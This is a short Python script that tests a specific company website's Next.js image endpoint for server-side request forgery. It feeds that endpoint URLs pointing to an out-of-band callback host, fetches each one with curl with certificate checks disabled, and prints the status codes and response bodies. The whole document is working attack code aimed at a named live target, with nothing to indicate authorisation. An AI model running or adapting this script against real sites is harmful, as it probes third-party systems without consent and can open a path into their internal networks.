import urllib.parse, subprocess, sys

H = "ooba1bc24dfe60d.dau2p4ghgqag02k5emggc5xu6hph3m973.oast.abhedi.co.in"
T = "https://www.infinitycapital.bh/_next/image"

urls = [
    "http://" + H + "/ssrf1",
    "http://" + H + "/ssrf2.png",
    "https://" + H + "/ssrf3.png",
    "http://" + H + ":8080/ssrf4",
    "http://" + H + "/a/b/c.png?x=1",
]

for u in urls:
    full = T + "?url=" + urllib.parse.quote(u, safe="") + "&w=640&q=75"
    p = subprocess.run(["curl", "-sk", "--max-time", "25", "-o", "/tmp/ssrfbody", "-w", "%{http_code}|%{size_download}", full],
                       capture_output=True, text=True)
    try:
        body = open("/tmp/ssrfbody", "rb").read()[:250]
    except Exception:
        body = b""
    print("URL:", u)
    print("  ->", p.stdout.strip())
    print("  body:", body)
    print()
